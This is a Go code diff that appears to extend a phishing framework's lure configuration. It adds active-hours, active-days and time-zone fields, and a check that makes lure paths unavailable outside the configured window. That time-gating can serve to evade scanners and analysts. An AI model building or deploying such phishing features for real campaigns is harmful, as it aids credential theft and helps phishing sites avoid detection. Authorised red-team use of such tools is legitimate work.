@@ -6,6 +6,7 @@ import (
 	"net/url"
 	"os"
 	"path/filepath"
+	"strconv"
 	"strings"
 	"sync"
 	"time"
@@ -44,6 +45,9 @@ type Lure struct {
 	RotateInterval  int64  `mapstructure:"rotate_interval" json:"rotate_interval" yaml:"rotate_interval"`
 	NextRotate      int64  `mapstructure:"next_rotate" json:"next_rotate" yaml:"next_rotate"`
 	RotateNotify    bool   `mapstructure:"rotate_notify" json:"rotate_notify" yaml:"rotate_notify"`
+	ActiveHours     string `mapstructure:"active_hours" json:"active_hours" yaml:"active_hours"`
+	ActiveDays      string `mapstructure:"active_days" json:"active_days" yaml:"active_days"`
+	ActiveTZ        string `mapstructure:"active_tz" json:"active_tz" yaml:"active_tz"`
 }
 
 type SubPhishlet struct {
@@ -770,6 +774,61 @@ func (c *Config) GetAutoLureByHostname(hostname string) (*Lure, int) {
 	return nil, -1
 }
 
+// isLureActiveNow returns false when the lure has time-gating configured and
+// the current time falls outside the allowed window, true otherwise.
+func isLureActiveNow(l *Lure) bool {
+	if l.ActiveHours == "" && l.ActiveDays == "" {
+		return true
+	}
+
+	loc := time.UTC
+	if l.ActiveTZ != "" {
+		if tz, err := time.LoadLocation(l.ActiveTZ); err == nil {
+			loc = tz
+		}
+	}
+	now := time.Now().In(loc)
+
+	if l.ActiveDays != "" {
+		dayMap := map[string]time.Weekday{
+			"Mon": time.Monday, "Tue": time.Tuesday, "Wed": time.Wednesday,
+			"Thu": time.Thursday, "Fri": time.Friday, "Sat": time.Saturday,
+			"Sun": time.Sunday,
+		}
+		dayOk := false
+		for _, d := range strings.Split(l.ActiveDays, ",") {
+			if wd, ok := dayMap[strings.TrimSpace(d)]; ok && now.Weekday() == wd {
+				dayOk = true
+				break
+			}
+		}
+		if !dayOk {
+			return false
+		}
+	}
+
+	if l.ActiveHours != "" {
+		parts := strings.SplitN(l.ActiveHours, "-", 2)
+		if len(parts) == 2 {
+			sp := strings.SplitN(parts[0], ":", 2)
+			ep := strings.SplitN(parts[1], ":", 2)
+			if len(sp) == 2 && len(ep) == 2 {
+				sh, _ := strconv.Atoi(sp[0])
+				sm, _ := strconv.Atoi(sp[1])
+				eh, _ := strconv.Atoi(ep[0])
+				em, _ := strconv.Atoi(ep[1])
+				nowM := now.Hour()*60 + now.Minute()
+				startM := sh*60 + sm
+				endM := eh*60 + em
+				if nowM < startM || nowM >= endM {
+					return false
+				}
+			}
+		}
+	}
+	return true
+}
+
 func (c *Config) GetLureByPath(site string, host string, path string) (*Lure, error) {
 	for _, l := range c.lures {
 		if l.Phishlet == site {
@@ -777,6 +836,9 @@ func (c *Config) GetLureByPath(site string, host string, path string) (*Lure, er
 			if err == nil {
 				if host == l.Hostname || host == pl.GetLandingPhishHost() {
 					if l.Path == path {
+						if !isLureActiveNow(l) {
+							return nil, fmt.Errorf("lure for path '%s' is outside active hours", path)
+						}
 						return l, nil
 					}
 				}
@@ -806,6 +868,9 @@ func (c *Config) FindLureByPath(host string, path string) (*Lure, *Phishlet, err
 			}
 		}
 		if l.Path == path {
+			if !isLureActiveNow(l) {
+				return nil, nil, fmt.Errorf("lure for path '%s' is outside active hours", path)
+			}
 			return l, pl, nil
 		}
 	}
